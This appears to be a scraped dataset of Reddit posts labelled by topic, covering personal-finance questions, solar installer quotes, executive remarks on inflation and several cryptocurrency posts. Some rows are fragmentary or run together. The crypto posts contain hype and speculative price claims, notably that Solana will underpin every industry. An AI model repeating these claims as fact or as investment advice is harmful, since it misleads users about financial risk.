Just to add how grateful I am that this happened--I was kicked out of my parents house at 16, moved to a different state, and was homeless until I joined the military hoping I could make a better life for myself. I have been working two jobs since I was kicked out--which is how I could afford to buy my house at 19--and at every turn when I thought I was doing the right thing (buying a house for example) I felt like I was getting kicked in the nuts (i.e. getting screwed with my house and having to spend so much money and be so stressed dealing with a lawsuit). Finally, I feel like my hard work has paid off. I consider myself somewhat financially smart, but I feel like this is way above any knowledge I have. Any advice would be greatly appreciated.  


***TLDR; I am 22, and received a settlement for the house I bought at 19, didn't use all of it, house sold for very much over asking. Now have disposable $80-90K, and a low-interest rate care loan. What is the smartest way to use this money?***",finance

I'm 22 and graduated from school with a Mechanical Engineering degree. I make $48k after taxes in Syracuse, NY as a product applications engineer at a tech startup. I have $27k in federal student loan debt and $13k in car debt (2018 Mazda 3, purchased with $2.5k down two months ago at 2.24% over 4 years, no pre-payment penalty on the loan).

Student loans are currently on forbearance due to the pandemic, but I think the average rate across all of the loans is 4.5%.

solar,"Price point for the Pacific Northwest: Vancouver, WA area","I'm in the Vancouver, WA, Clark County, USA area, just north of Portland, OR.  My electricity rate  is $0.0814/kWh 24/7 without tiers, and so solar systems are less of an electric bill reduction and more of an investment in this planet. My repayment period never dipped below 16 years---again, it's an investment in our planet. The system I chose has a repayment period of 22 years and ROI of 4.5%. I made my decision primarily based on installer volume: lengthy repayment period means the likelihood of the manufacturer and installer being around is important.

I've been toying with solar for over a year, and in that time have solicited eight proposals, all from local installers. I'm not going to write about them all because some were nonsense at above $3.50/watt. **All prices I'm mentioning are before federal and state incentives.**

**Company 1:** The best price I received was SolarEdge + Hanwha other-than-black 400 watt panels at **$2.32/watt** by a company opportunistically working in my county but with a home office 7 hours away. Because they'd have a very hard time servicing the equipment, I passed on this bid despite the insane price.

**Company 2:** The next best price I received was a Portland, OR based low volume installer with exceptionally good reviews.  I mean literally perfect reviews. I passed on their bid  because: (1) they're low volume, (2) they have no physical office, and (3) their company has wholly changed owners in the last 3 years. They have an excellent salesman---by every metric the best salesman I spoke with. This system was for Hanwha Q Cells 380 G9+ Black with two SolarEdge Inverters (one a ""hub"" model capable of generator tie-in) at **$2.55/watt.**

**Company 3:** The next best price I received was $2.60/watt by a Clark County, WA company that seemed to have a hard time walking me through the options I had in front of me. My requests for more information, or for their thoughts on system combinations I might propose in order to benefit my learning, were interpreted as change requests. They also had some bad reviews about the roof flashing work they did, and some reports of ghosting clients with tech issues. The presentation material they sent along with their proposal was full of nonsensical figures like ""number of cars taken off the road"" and ""number of trees planted."" After iterating a few times on the system with their sales rep, we settled on Q Cells 380 G9+ Black with IQ7+ at **$2.60/watt.**

**Company 4:** I chose these guys for the same Q Cells 380 G9+ Black with IQ7+ at **$2.70/watt.** This Clark County, WA company offered a no-nonsense, short form proposal. They have very high reviews, perfect if you include only solar reviews (the only negative reviews I found were related to the fact that they also run a general electrician line of business). They worked with me to discuss options for tying my house to a generator. The biggest reasons I chose them:  (1) install volume: they do crazy business, (2) they've had one owner, their founders, for over a decade, (3) they have a physical address.

I wish things had gone better with Company 3. I really wanted to like them. At first they were really nice, but I asked too many questions and altogether it soured.

I wish Company 1 were closer.

I wish I felt Company 2 had any chance of surviving for the next 10 years. If I'm going to regret passing up any of the lower-cost bids, it'll be this one.

Altogether, with my nonsensical investment-of-love repayment periods, I opted to heavily weigh my perceived likelihood of a company surviving for the next 10 years over all else.",energy
personalfinance,can a lender look past a mortgage default and include my income on a new loan for a different house?,"**TLDR - can a lender look past a mortgage default and include my income on a new loan for a different house? My mortgage has been in default for several years. Remarried and spouse wants to buy a house but we probably need both incomes.**

I got divorced about 10 years ago. Ex took out several loans on the house. I was young and dumb and signed whatever he told me to sign. The money didn’t go into the house, it went into toys, like 2 motorcycles.

He filed bankruptcy during our divorce. The equity company can’t foreclose since it’s been too long but they still have a lien on the property. The primary mortgage is likely underwater as the house is in disrepair. I was unemployed and was unable to take over payments but the bank never took the house as it was protected in my ex’s bankruptcy. The house is in limbo. It’s not a foreclosure, not a short sale, it doesn’t even really show up on my credit report. But I know I can’t pull the kind of reports a lender could.

I remarried. He was military and has a house but we are looking at relocating now that he’s retired.

The old house is vacant so we could move back there but would need to re-establish the loan - either paying years of payments to catch up, refinancing, or modifying the loan. I was recently awarded disability so I have some income but it’s not enough to take over the house on my own.

My spouse doesn’t want to return to my old house. He sees it as a bad investment. Between the primary mortgage and equity loan, I owe more than the brand new, much bigger houses in the neighborhood are selling for. The house needs thousands in repairs from foundation to roof - he sees it as a giant money pit. I get things from his point of view - he doesn’t want to basically pay for my ex’s motorcycles and stuff. 

We are looking at finding a new house and found one we would need to jump on now. With our combined incomes, we more than meet income requirements. But given the issues with my house, I don’t know that I can be part of the loan. And I get it from a lender’s perspective. If I didn’t pay that loan, what would make them think that I’d pay a new loan.

We have 2 car payments which aren’t an issue but they’re both in his name since he has better credit and gets better interest rates. With both of our incomes, our debt to income still looks great. But with his income alone, the car payments are a good percentage of his income. Honestly, I’d be fine selling the cars. But even with that, it’s a stretch for him to get approval on his own.

Is there anything we can do short of getting divorced and having a court order saying I have to send him a ton in alimony? For the record, I’m not actually suggesting fraud.",finance
investing,Recent corporate executive comments on inflation,"Procter &amp; Gamble

“The commodity cost challenges we face this year will, obviously, be larger next fiscal year. We will offset a portion of this impact with price increases. Our Baby Care, Feminine Care, and Adult Incontinence businesses have announced price increases in the United States that would go into effect in mid-September. The exact timing and amount of increases vary by brand and sub-brand in the range of mid-to-high single digits.”

Honeywell

“And for us, inflation is taking hold. There is no doubt about it. We knew it. We see it, it's real. And if you don't stay on top of it, the two areas where -- and this is not a surprise. Steel, semiconductors, copper, ethylene, those are the four elements that we saw substantial inflation in Q1…. I don't think things are going to abate. The short cycle is definitely hard. We all read the same articles around semiconductors and what's going on there. And I think we're going to have to just stay ahead of it. But we do expect that inflationary environment this year and we're going to be to stay ahead of it.”

Kimberly Clark

“I'd like to start the call today with a few brief remarks. Our first quarter results and outlook have been impacted by supply chain disruption, faster-than-expected consumer tissue de-stocking, and a sharp rise in input costs. While I'm not pleased with the results and our outlook, we're taking decisive actions to manage through the short-term challenges we face.”

Coca-Cola

“… we're closely monitoring upward pressure in some inputs, such as high fructose corn syrup, PET, metals and other packaging materials as they impact us, as well as our bottling partners.”

PepsiCo

“In terms of '21, there is certainly higher input inflation, but it's been factored into the '21 guidance, notably in terms of agricultural and packaging. In addition to that, we have also factored in the higher freight and transportation costs that we're experiencing out there right now.”

Nestle

“I would like to caution against excessive margin growth expectations based on these strong sales growth. We now see broad-based inflation across our various commodities, packaging materials and transportation costs. Not all of these items can be hedged and our hedging cover for a number of commodities will run out over time. We are raising prices where appropriate, but usually there is a time lag associated with pricing.”

Danone

“When it comes to inflation, you're absolutely right to say that we have seen an accelerating inflation since the start of the year, which is impacting us, I would say, across the different ingredients, which is on milk, but also other dairy ingredients, on plastics, on sugar, but also, as I said, on logistics and transport. And we are reaching now a very strong mid-single digit level when it comes to inflation.”

Boston Beer

“On the freight, clearly, this is -- there's a factor that you probably have heard that on other calls in the industry. There's a real shortage of drivers and of trucks. So the ratio between available trucks and loads have significantly worsened. And that's what we see in the rate. To the point that we've broken it out really in the earnings release separately because the impact is significant. And it really depends, right. We have contracted rates, but then you don't get the truck and you have to go deeper into it. So we've seen the impact on multiple levels. One is the input costs are going up …it's coming into are our cost and materials and that's ingredients, the packaging materials. So we see it there.”

Celanese

“I mean, we're certainly feeling the inflationary factor. I think, the good news is, we anticipated this coming back in fourth quarter of last year already and started moving prices in engineered materials to reflect this, and of course, that price ultimately still gets reflected more quickly. So although it is an inflationary pressure, we've been able to push that through in our pricing and basically maintain the same level of variable margin.”

Crown Holdings

“…we thought it would be well to remind you that delivered aluminum in North America sits around $1.28 a pound versus $0.75 a pound last year at this time. So an increase of 70% and as we contractually pass through the LME and the delivery premium reported revenues will reflect both volume increases and the higher aluminum cost this year.”

Steel Dynamics

“Despite record first quarter 2021 shipments for our steel fabrication segment, first quarter operating income was $10 million compared to sequential fourth quarter earnings of $25 million. Lower earnings were the result of metal spread compression as higher average selling values were offset by significantly higher steel input costs.”

Mattel

“We're not going to talk about specific pricing actions or timing. But we are evaluating price adjustments for the recent increases in input costs and I would also want to point out that despite the cost inflation we're it seeing and the impact it's having on gross margin.”

Whirlpool

“So while the macroeconomic environment remains uncertain, we are confident that sustained strong consumer demand and our previously announced cost-based pricing actions will offset the impact of global supply constraints and rising input costs.”

Snap-On

“Look -- yes, well, look, we've got material inflation in these numbers. We can't see them, can you? Right. And so part of the thing is you got -- you kind of got an interesting cocktail of reduced travel, controlled costs, material inflation floating through this. And the general managers in our businesses are balancing all these, like balls in the air. And so yes, we might see some, but we're not -- at the same time, we can also price. And I think the tools group has got another price increase going out. They just announced in April, early April, they announced the price increase, so they're going to have one coming up.”

GATX Corporation

“…we buy cars both on the spot market and through our supply agreements that the majority of which is through the supply agreements. So certainly, the increased price of steel is increasing the cost of a car across the board.”

Dover Corporation

“I get it that the Fed doesn't want to recognize inflation, but there is inflation and it's not just a raw materials because raw materials are in the subcomponents that we buy from our vendors who are trying to pass along the same kind of price increases that goes into our bill of materials and everything else. And clearly at the assembly level on labor availability is becoming a problem and that is beginning to start to move up labor costs over time. So, it's now gone from, it's a capital good size that are buying a lot of raw materials now it's moving into the assembled components portions of the business that is going to have to accommodate that over the balance of the year. On top of that, as I mentioned before, logistics costs we ship a lot of product that's FOB, so we're not, it's more inbound logistics costs then it is outbound logistics costs. But freight costs are going up because you're going to add. I mean, God forbid, you have to air freight anything right now. It's a bit of a negative.

Sonoco

“Our Industrial segment was hit the hardest with price/cost challenges, due to the higher OCC costs internationally as well as higher-than-expected inflation and operating costs like energy and freight.”

TE Connectivity

“Certainly, we're feeling the biggest inflation right now is on the freight side. The freight inflation has been significant and as we battle through there and there's a variety of reasons for that, including higher air freights and so forth in terms of that and that's not unique to TE. Certainly, I think that's been -- is well publicized across the overall supply chain. We are -- as we move towards the second half of the year, we are seeing a little bit higher input costs, particularly with the resins and some of that pretty directly attributable to the weather issues that were in Texas here earlier this past quarter. And then, the copper prices as we've continued to monitor those, we've seen those creep up. In some cases, we have hedges in place in terms of how we hedge our metals cost.”

Badger Meter

“I mean even Just in the first quarter, we saw the input cost go from $3.60 to today $4.20 and that's after March having been a relatively favorable change that obviously has been erased here in the month of April. So I think it's what we've been saying all along in terms of the continued price focus and the opportunity and the market acceptance of being able to pass some of those increases through in today's dynamics and in today's environment. We're going to continue to do that, and we're going to do that to a degree that we're able to -- we believe we'll be able to offset the majority of the cost pressures. And I don't see that changing dramatically as we move forward.”",finance

CryptoCurrency,"I put together top 5 ""Ethereum killer"" i can think of","Polkadot (DOT)(34$)

First on the menu of ethereum killers is Polkadot. The new kid on the block, DOT launched in 2020, and the tokens are fairly cheap at this time. DOT’s claim to fame is that it’s blockchain allows for arbitrary data to be exchanged, not just specific data carried on traditional blockchains. This is impressive because this is part of what allows Polkadot to be transferred across multiple different blockchains. That’s a lot of technical jargon, but in short this allows DOT to be transferred in a variety of ways, across a potential variety of platforms. It’s an ambitious project, with broad spectrum applications.

The data loaded onto DOT’s blockchain can be exchanged on private networks available to some as well as public ones available to all. It can go between them as well, meaning a private network can trade to a public one and vice-versa. This has applications in a variety of fields and not just in the trading of currency. An investment in DOT, may be a broad-ranging investment, and not solely tied to the field of currency. When you invest in DOT, you’re primarily investing in the technology of it, not necessarily the currency. Certainly an interesting Ethereum alternative.

Tezos (XTZ)(5$)

Next up on my menu of Ethereum killers is Tezos. XTZ is very user focused; An open source project, allowing users to weigh in on project governance and the direction of the blockchain, for a buy-in price of 8,000 tokens. This user governance is designed to prevent forks and conflict in the currency, which should, in theory anyways, retain value in the longer term as more users adopt the technology. In addition, what makes XTZ impressive is it’s security, modularity, and ability to be upscaled. Three things that are important on their own, but impressive when they’re all rolled in together. This is an ambitious claim, but how does that work?

Thinking with the future in mind, stakeholders of XTZ can shape the trajectory of the project. XTZ was among the first to use a proof-of-stake mechanism rather than proof-of-work, way back in 2017. Proof-of-stake is becoming increasingly popular among blockchains, compared to the proof-of-work loaded into traditional blockchain currencies like Bitcoin. Tezos rewards users for contributing to blockchain consensus with their proof-of-stake system. What that jargon means, is that users are rewarded for contributing to the security and stability of the network.

Cardano (ADA)(1.3$)

Third on the list is Cardano. Founded by Ethereum co-founder, Charles Hoskinson. Cardano is also a proof-of-stake, open source, blockchain like the previously mentioned Tezos. Cardano brands itself as a more academic blockchain project, with new ideas and additions to the project requiring a peer-review before they can be adopted on the network. The design theory behind this peer-review concept is that this will create a more robust network that will be able to solve potential problems sooner before they become serious problems.

Cardano’s philosophy is centered around individual governance and reaching consensus. Each token holder is given a stake in the network and are incentivized to vote and participate in how the network functions. These are divided into two categories. A funding proposal (FP) and Cardano Improvement Proposals (CIP). FPs are voted on via dedicated application and CIPs are done through a GitHub repository.

These systems allow stakeholders to make proposals about functions that Cardano/ADA doesn’t have at a particular moment. Each vote requires a temporary payment of ADA, to ensure accountability and that successful proposals receive funding. With a supply of 45 billion, ADA is very cheap on a per-token basis. If direct democracy on a budget is your thing, this is the ethereum killer for you.

Stellar (XLM)(0.5)

The cheapest token on my list, weighing in at about half USD per token, is Stellar. Yet another open source project, Stellar provides its user base with the ability to create, send, and trade all forms of money in a digital format. So you could trade Mexican Pesos for US dollars for example. Stellar is an ambitious project, making the claim that all of the world’s financial institutions could run on the network. Blockchain technology keeps the XLM network in-sync across devices. This is similar to previously mentioned Polkadot, where this is more of a blockchain technology investment, rather than a dedicated currency such as Bitcoin.

Stellar produces a token of its own called the Lumen, which is used in small volumes to process the actual currency transactions. To continue with the example above, Stellar would permit you to create a digital representation of a Mexican Peso. You would call this a Peso Token on the Stellar network, and then tell everyone on the network that for anybody that deposits a traditional US dollar into that account, you’ll give them a Peso Token. When this person comes back with their Peso Tokens, you exchange that in turn for traditional US dollars. So in essence, you become your own little Federal Reserve, except you get to choose what your token is backed by.

NEAR Protocol (NEAR)(5$)

The last, but certainly not the least, project on the list is the NEAR protocol. NEAR is an open source project focused on smart contracts and the proof-of-stake system, like most other Ethereum killers on our list. A big selling point with NEAR is the lower transaction fees. NEAR claims that their transaction fees are 10 times lower than Ethereum’s. What makes NEAR unique, is their focus on development, community, and creation of applications.

If you’re already an Ethereum holder, NEAR has your back. NEAR’s rainbow bridge technology allows holders of ethereum to operate on both blockchain systems. NEAR’s rainbow bridge is part of their effort to support the upscaling nature of blockchain technologies. The mission with the rainbow bridge is to enable low friction movement of assets and data across different blockchains. 

Creating apps, nodes, or pretty much any digital service on the NEAR platform offers rewards of some kind. Their website has a ton of details and it’s loaded with a lot of technical information that developers and would-be noderunners would want to know. NEAR’s token is currently valued at $5 at this time of writing, and is the least mature project of the bunch that i selected. What does that mean? It means that it has the most potential to grow in the future.

I am just wondering if anyone else believes it’s reasonable to speculate that down the line if the US decides to federally legalize or make some dramatic reform to the cannabis laws in America, would APPH be in a advantageous situation to transition a small part of their operation into possibly growing cannabis?  If they already have the vertical farming in place, climate controlled, I would think it would give them a good starting point to begin growing quality cannabis.  Please don’t destroy me for this but I am just really curious if I’m the only one who has thought about it.

ethereum,I am still not sold on the value proposition of DeFi. 5 key criticisms.,"**Who is DeFi really revolutionary for?**

**Is DeFi a good thing primarily for those who live in unstable countries?**

After working full-time in a blockchain startup specifically working on Ethereum, and after spending way too much time learning and using various DeFi protocols, I am still not sold on its various value propositions. There are some clever and creative solutions out there, and we're obviously only starting out. But I still feel like the core offerings of DeFi are weak, and its goals are the same as those of the traditional financial system, i.e. maximise returns. It's not useful or viable for ""the little guy"". I would love to be proven wrong. Let's look at a few examples (in no particular order), with my thoughts and criticisms. 


**1. Higher interest rates**

I've played around with both Aave and Compound. Getting 7-10% interest rate on my deposits is obviously cool. But this is - like Mark Cuban stated in the Bankless podcast - a game of musical chairs. The music will stop. In other words, the high interest rate we're seeing is primarily due to the market being relatively small. It won't stay this high long term. 

The rates are supply and demand based, so if we suddenly saw a major influx of people stream into Aave to deposit USDC, the supply would be way too high, and rates would drop, removing the actual reason why people wanted to use the service to start with. As the market grows, rates will lower as well. That's classic economics. So this is a short term value prop only. 

Edit: /u/jibishot made a really good point. *""Not to mention this brings up the much bigger strength in defi and that's trustless liquidity and less fractured liquidity on a global scale.* ***Which means higher yields are sustained because that damn friction eats all of it up in trad fi."" ***

That makes sense to me. And if data supports that in the long term, my arguments are void. Then offering higher rates than tradfi markets is 100% a working value prop. 


**2. Novel applications and programmable money**

Let's use TokenSets as our first example. I love it and use it, but it's nothing revolutionary. It's like placing your money in a fund, except that you have a robot that manages and rebalances your fund instead of a person. It's also cool that anyone can create a fund strategy (assuming they have the knowhow) and publish it for anyone to follow, but for the user/investor, it's still ""just"" a fund. 

How about no loss lotteries? Again - it's a fun application, but it's still ""just"" a lottery. 

Exotic products, like margin trading, perpetuals, yield farming etc? Sure, it's cool if you know what you're doing, but it's still going to appeal to a small fraction of the population - and I'll venture a guess that it's most likely those who already work in or with finance and that have capital to manage. It will probably not benefit or be viable for ""the little guy"". 


**3. Open to anyone. No KYC. Censorship resistant**

I mean, having previously worked in banking, KYC is without a doubt good. Knowing who you deal with is good. Being able to track and stop fraudulent or criminal transactions is a *good* thing. Banks (at least in civilized countries) won't stop/censor a normal person's payment. Why is it a good thing to remove these mechanisms? What's ironic is that when banks fail doing their KYC checks properly, then we - the crypto sphere - jump on it and make it out to be proof of why banks are bad. It's hypocritical. 

Furthermore, a common argument is that criminals don't use crypto. I'd say again, this is due to it being a relatively small market, and the UX for most applications have been bad. Path of least resistance for most people - including criminals - is still cash and systems they know. As the market grows, it's not unreasonable to assume that a percentage of those getting into the market will use it for bad. A proper system for preventing fraud, CTF or other illegal activities surely must be good?


**4. It leads to more open, decentralized and liberalized finance markets**

Open: Sure, a market that is open 24/7 is good for the finance people who already operate actively in the market. Not for anyone else. 

Decentralized: This is valuable to me generally - not just for DeFi, but as a system in general. But I would argue it's not important for the majority of the population. ""Not controlled by **one** company? Ok, but how does that benefit me directly?""

Liberalized: Do we really want a **more liberalized** financial market? We've seen many times what that has lead to (e.g. repeal of Glass Steagal). Sound regulation on financial markets is critical, otherwise it'll devolve into whatever financial play that turns the highest yield, disregarding everyone and everything else. And sometimes that ends up with an enormous crash and decades of recovery. Not good. Regulation is good. 


**5. Allow everyone to participate in the financial markets**

I can already do everything I want to do and need to do within the existing financial infrastructure. Send instant, feeless payments. Trade stocks and funds. Leverage my investments and speculate. Gamble. Insure my shit. The stuff that is important to me, I can already do. That which is not important is offered by smaller players adjacent to the financial market. 

I live in Scandinavia, where we have a robust, well developed and well regulated financial system, high trust in government, low corruption etc. *That is obviously not the case everywhere*, so the question then becomes: Does the value propositions of DeFi fall short in highly developed nations like the Nordic countries? Is it only beneficial for people with failed governments, failed economies etc?


**Closing thoughts**

Maybe I am looking for something in DeFi that never was meant to be there - something that helps the little guy - not just an unregulated, unscrupolous, wild west finance market that will undoubtedly be attractive to those who already have capital to invest, but not so much for others.

The technology is cool. But looking strictly from an end-user perspective, DeFi is still not as big as it's made out to be.

____________________________________________________________________________________

**Edit:** I am really happy with the discussion this sparked, and genuinely appreciate the different views and opinions on this, and the quality of the discussion. I find that has become rather scarce on Reddit generally. So again, hats off to the Ethereum community. 

I have a couple of takeaways from this thread. 

**1.** Context matters. Looking from a purely Nordic/Scandinavian standpoint, where most of our institutions are well functioning, some of the fundamental appeal of DeFi disappears. However, that does **not at all** mean that it has no value elsewhere, and it can indeed revolutionise financial systems elsewhere. 

**2.** The tech is awesome, but it's still just tech, and tech is neutral. I am possibly looking for values that aren't there. Furthermore, we're still early. Using today's solutions to judge the entire system and the value it holds, I am excluding the enormous potential it can hold in the future. We're still in many ways playing catchup with the existing financial system in terms of features. But we're pretty much there, and it's been, what, 5-6 years? Give it another 5, and it could indeed revolutionise something. 

**3.** Like traditional finance, DeFi is particularly good if you own assets. It's awesome for people who got in early and can collateralize the crypto you own to e.g. take out a loan. But what about those who won't get in early, or won't have assets to collateralize? Are they shit out of luck? How could my friend who lives in this well functioning Scandinavian country, but with minimum pay, no house, no car, benefit from DeFi?

**4.** DeFi is still very much a closed space for very early adopters, primarily Westerners. If it's meant to revolutionise financial systems where traditional systems have failed, [we're not doing a very good job to reach those groups](https://thedefiant.io/defi-has-a-first-world-problem-too-few-developing-nations-users/).",cryptocurrency

The company we're going with has provided some financing options.  Or we can do ""cash"", which really means outside financing since paying all that up front would deplete 75% of our cash reserves (including an uncomfortably large chunk of our emergency fund).

I've narrowed things down to these two options, and was wondering if the PF community could point out any pros/cons or pitfalls that I've missed.  Or whether one has any major advantages over the other:

**Option 1:** Installer financing with a ""combo loan""

* Financing done through Salal Credit Union
* 12 year term @ 2.99%, fixed rate, no pre-payment penalty
* $945 origination fee
* A ""prepayment"" due at 12 months equal to the 26% federal solar tax credit we'll be receiving next year, calculated against the loan amount + origination.  This is treated as a ""delayed"" down payment, so the monthly payment is calculated against the borrowed amount minus that future payment.  If this is not made, monthly payment is recalculated for the rest of the term.
* Current proposal setup with a $5k down payment + $4k prepayment. So an effective financed amount of $11,660, resulting in 144 monthly payments of $96

Pros: Fixed rate, low monthly, partner financing means all invoicing handled internally to the installer.  

Cons: If for whatever reason we do not make the pre-payment next year, the minimum payment re-amortizes to $133 / month for the remainder of the term.  May (or not?) count as a lien against home.  But we're not planning on selling or refinancing anytime soon, we just refi-ed to 2.25% in January.

**Option 2:** HELOC though my credit union

* A 10 year ""draw"" period (when I can tap the LOC) followed by a 15 year repayment period.
* Variable rate.  Listed as ""Wall street Journal Prime Rate -0.75%""; currently quoting 3.5%
* Rate adjustments done twice a year.  The max increase in one calendar year is 2%.  Max increase over life of the HELOC is 8%.  So if I understand that correctly, it will never go above 11.5%.
* With just the primary mortgage, our home's current LTV is 40% on a $525k valuation.  Home prices have been on a big upswing the past 10 years since we bought.
* Origination fee: $1250.  But $600 of that is for the home appraisal.  The loan officer I've been speaking to said that underwriting may waive the appraisal if we keep the mortgage + HELOC LTV under 60%.  I'm not sure where that valuation would be taken from, something like Zillow or county assessment?  That still gives me potentially $100k to apply for (though I'd probably stick to $50-75k), and would reduce the origination fee to $650.
* Current plan for solar payment is do $5k cash + $15k draw from HELOC.  Next year's tax refund will include $5k solar credit (our tax liability is high enough to not need carryover), and we'd apply that to outstanding balance, similar to Option 1's ""prepayment"".  

Pros: Lower origination fee, assuming appraisal can get waived.  More flexible payment amount, though monthly minimum may have a floor of $75-100.  Provides checks and debit card for drawing against it.  The LOC remains available to us for future home upgrade projects we've been considering.  Easier payments since it'd just be a transfer between accounts at the same bank.  

Cons: Slightly higher rate than financing.  And variable rate mean potential for even higher in future.  Another lien against the property.  

Are these close enough in rate (at least until future adjustments, not sure how to gauge that possibility) that it's mainly a tossup for this project?  I do like the option to have the LOC already there for future upgrades without dealing with applying for new financing.",finance
personalfinance,Selling brokerage funds to start an IRA,"I am considering emptying a brokerage account to start a Roth IRA, and wanted to know if this sounds reasonable based on my goals/interests. The brokerage account is through American Funds, a UTMA account set up for me that I recently took custody of. It has about $7000 (total cost basis is about $3100), all of which is in ANWPX (0.76% ER). I know that I can't make a transfer, and that based on my income I will owe taxes on the gains of what I sell, that's not a concern. 

I'd probably go for a target date fund in the IRA (I'm 26), because I don't really have an interest in getting too micromanage-y with my retirement planning. Currently I have a 6 month emergency fund, a student loan fund that I've been adding to since payments got suspended (federal loans, all have interest &lt;5%, not a huge concern for me regarding this whole thing), and I do have about $2k that I'm not really doing anything with. 

I suppose I could use the $2k not doing anything and just use $4k from the brokerage to max out 2020 Roth IRA contributions, but I don't see myself contributing to it any time soon since I'd have a Roth IRA and my 457b through work ahead of it, and the fact that American Funds has a 5.75% front load charge. I'd probably end up going elsewhere anyway if I ever hit the point of contributing to a standard brokerage account.

What got me considering all this is I still have time to make 2020 contributions if I get on this quickly enough, and I've been doing some homework and realizing I am not quite where I should be regarding retirement. Does this seem like a reasonable plan?",finance
solana,"A summary of Solana, the tech, and why it is the future + comparison to other top projects","**Solana**

Solana will be the future of Web3.0. Everything you can think of, including any payment processing system, credit card networks, big bank deals, getting loans, stock exchanges, NFTs, Internet of things, 5g micropayments, cloud computing, energy tracking, supply chain tracking, identity tracking, video streaming, gaming, artificial intelligence, taxes etc. will be based on Solana.

**A history of blockchains**

We started off with the concept of proof of work, where essentially the chance of a miner getting to create the next block on the blockchain is proportional to your computer power. A block on a blockchain is essentially a series of transactions that are published to a public ledger and verifiable to be correct. The amount of computer power you put towards a hashing algorithm (say sha256), then the higher the share you are of the network and more likely you are to generate the next block. These systems have limitations with very low transactions per second (in the tens to hundreds of tps) and time in between blocks (block time). The entire purpose of these systems is to decentralize transactions to ensure one entity is not in charge of writing transactions and is potentially corruptible. In a centralized system, all you need is access to the main system and you can change transaction history and data with ease. Examples of proof of work blockchains are ethereum and bitcoin.

People started to realize proof of work cannot be the basis of the decentralized web3.0 because of the low tps and high block time. This stems from the time needed to actually do the ""work"" and mine a block. Projects like cardano, polkadot, vechain, and theta built on proof of stake were created to solve these issues. Cardano has a blocktime of about 20 seconds (which can be lowered) and a tps that is scalable. Cardano does not have smart contracts live. Polkadot has a blocktime of about 12 seconds on the relay chain, and a tps across all parachains of about 1,000,000 transactions per second. These are the two leading proof of stake blockchains right now. Ethereum, the current leader of smart contract blockchains, is moving to proof of stake next year and will have a max transactions per second of 100,000 and a block time of 12 seconds. As we can see, proof of stake solved the tps issue, but not the blocktime issue. If we want wide adoption of a decentralized ledger, block time MUST come down in order for it to be feasible to host a stock exchange, payments processing system etc. on the blockchain.

Projects like XRP, stellar, hedera, are more centralized high tps, fast block time chains. Unfortunately, these blockchains have 10-100 nodes compared to SOL's 500+ which means they are essentially centralized systems. With SOL, anyone can make a node if you have 3-4 thousand dollars of hardware. With XRP, stellar, hedera, only a few nodes ran by big businesses can create nodes and verify transactions. Even then, the TPS of these ledgers vary from 1k to 10k, still much less bandwidth than Solana. And the block times of these protocols range from 3-5 seconds, many multiples higher than Solanas.

Solana has a **max tps of 760,000**(which is scalable to infinity with internet bandwidth and cpu/gpu speed increases (aka Moore's law) with a **block time of 400 ms (.4 seconds)**. Solana is already the fastest, and has great potential to be the most decentralized system to ever exist (already very decentralized). It is limited by the network it is built on(internet speed) and is CURRENTLY as quick as centralized systems can be. This is the first time ever, a decentralized system can actually outperform a centralized system. This will be the catalyst for people to move off of centralized systems to increase their security. Before, people didn’t care too much about decentralization because why would you sacrifice tps for decentralization. Now, there is no reason not to switch. When you switch, you have more security and retain the same functionality of centralized systems. For example, Visa, which processes transactions on a centralized server: If the database or the servers got hacked through a variety of ways, anything could be changed and modified. On Solana, to do the same thing, you would have to make a cpu that could outperform all other cpus by a vast margin, something that would require billions and billions of dollars of R&amp;D. Solana also has live smart contracts, which opens up the market for DeFi.

**Who created it?**

Solana was created by a team of elite software and systems engineers that specialized in bandwidth optimization, app development and system optimization at intel, qualcomm, dropbox, microsoft, google, twitter, and apple. The creator, **Anatoly Yakovenko**, is from California and worked at qualcomm as a leader for development of operating systems, distributed systems at mesosphere, and compression at Dropbox. He was also the core kernel developer for BREW which was the largest phone operating system before iphones/android and powered every CDMA flip phone (over 100 million phones).

Description of BREW: The BREW solution also includes a server component which resides on the network. The BREW server manages the network side of BREW downloads, including billing, and can also serve and bill for non-BREW applications and content.

He has two patents for high performance Operating Systems protocols. It makes sense that Anatoly was able to think of and execute the creation of the unique Solana decentralized blockchain because his experience is so closely related to the skills needed to build an efficient blockchain. Solana achieved the insane block time by taking tested knowledge and concepts from cell phone towers and bandwidth optimization in systems to improve upon the blockchains that came before him.

Along with Anatoly, many chief software engineers at qualcomm left to join the Solana project because they were conveniently being acquired by Broadcom. This is how Anatoly got such an elite team to build such a progressive project.

**The main tech behind Solana**

Solana brings a new method for deciding who processes the next block. It is called it **Proof of History**. Essentially, timekeeping in typical proof of stake blockchains is important because that’s how you decide when the next node to process the next block is selected. This makes the network vastly inefficient and prevents blocktimes from getting smaller than the time it takes a message to propagate around the entire network. This ends up being 10-12 seconds for most proof of stake blockchains. Proof of History uses every nodes cpu to essentially keep time. It uses a recursive hashing algorithm that when the output is fed back in as the input, is able to quantifiably show that a certain amount of time has elapsed and allows the selection for the block leader (the node that processes the next block) to be quicker than 10-12 seconds. The block time is currently set at just .4 seconds, but can decrease even further with Anatoly's known goal to make the network so fast that a message from one side of the world travels along fiber and propagates across nodes as quick as light. This is realistically possible with Solana. Without going into the weeds too much, if a block is given to two nodes at the exact same time because both of their proof of histories showed they were the next block leader, then a proof of stake system is activated and whichever node has more SOL staked to it, is the node that creates the next block.

**Top projects built on Solana**

A blockchain is defined by the projects built on top of it. In the past year that Solana has been running, it has attracted some of the best developers in the blockchain ecosystem. This is a testament to the sound fundamentals. The project has 128 and counting projects in the ecosystem with some of the biggest names around commiting to Solana.

Serum is a decentralized exchange that uses the order book method of typical centralized stock  exchanges in order to allow trading. Solana is the only blockchain capable of hosting such an ambitious project because of the high tps and low block times.

[https://www.oxygen.org/](https://www.oxygen.org/) Is a one stop shop defi solution for defi lending and borrowing, asset management, brokerage protocol. This is one of the most exciting projects in the entire blockchain space and was recently funded with 40 million dollars from billionaire Sam Bankman-Fried. It is still in alpha and has only 7 million dollars in liquidity, but keep an eye out for this token built on the serum dex.

More in depth knowledge about Solana's tech. [https://research.binance.com/en/projects/solana](https://research.binance.com/en/projects/solana)

In conclusion, Solana is the first highly decentralized (500+ nodes that anyone can start), quick, verifiable public blockchain that is here to exist forever and will be integrated into EVERY single industry that we know today. The tokenomics are good, with a dedicated token minting rate and modest inflation. If you buy SOL, be sure to open a solfare wallet which can be done to stake your SOL and earn rewards. Stake to a node lower than the top 100 in terms of amount of SOL staked in order to ensure decentralization!

**My Opinions**

